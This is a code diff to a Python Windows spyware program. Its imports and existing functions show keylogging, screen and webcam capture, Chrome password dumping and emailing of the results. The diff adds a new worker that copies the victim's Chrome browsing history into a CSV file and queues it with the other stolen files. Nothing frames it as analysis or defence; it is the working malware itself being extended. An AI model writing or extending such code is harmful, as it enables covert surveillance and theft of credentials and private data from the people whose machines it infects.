@@ -1,4 +1,5 @@
 import os
+import csv
 import time
 import psutil
 import pyHook
@@ -8,7 +9,6 @@ import win32gui
 import mimetypes
 import pythoncom
 import win32crypt
-import subprocess
 import win32console
 import win32clipboard
 from os import getenv
@@ -16,15 +16,16 @@ from Queue import Queue
 from PIL import ImageGrab
 from threading import Thread
 from VideoCapture import Device
+from email.utils import formatdate
 from email.mime.base import MIMEBase
 from email.mime.text import MIMEText
 from email.mime.image import MIMEImage
-from email.utils import formatdate
+from datetime import datetime, timedelta
 from email.mime.multipart import MIMEMultipart
 
 
-NUMBER_OF_THREADS = 5
-JOB_NUMBER = [1, 2, 3, 4, 5, ]
+NUMBER_OF_THREADS = 6
+JOB_NUMBER = [1, 2, 3, 4, 5, 6, ]
 queue = Queue()
 
 
@@ -251,6 +252,23 @@ def dump_chrome_passwords():
         f.close()
 
 
+def dump_chrome_history():
+    connection = sqlite3.connect(os.getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\history")
+    connection.text_factory = str
+    cur = connection.cursor()
+    output_file = open('chrome_history.csv', 'wb')
+    csv_writer = csv.writer(output_file)
+    headers = ('URL', 'Title', 'Visit Count', 'Date (GMT)')
+    csv_writer.writerow(headers)
+    epoch = datetime(1601, 1, 1)
+    for row in (cur.execute('select url, title, visit_count, last_visit_time from urls')):
+        row = list(row)
+        url_time = epoch + timedelta(microseconds=row[3])
+        row[3] = url_time
+        csv_writer.writerow(row)
+    files.append("chrome_history.csv")
+
+
 def create_workers():
     for _ in range(NUMBER_OF_THREADS):
         t = Thread(target=work)
@@ -271,6 +289,9 @@ def work():
         dump_chrome_passwords()
     if x == 5:
         webcam_pic(interval_webcam)
+    if x == 6:
+        dump_chrome_history()
+
     queue.task_done()
 
 
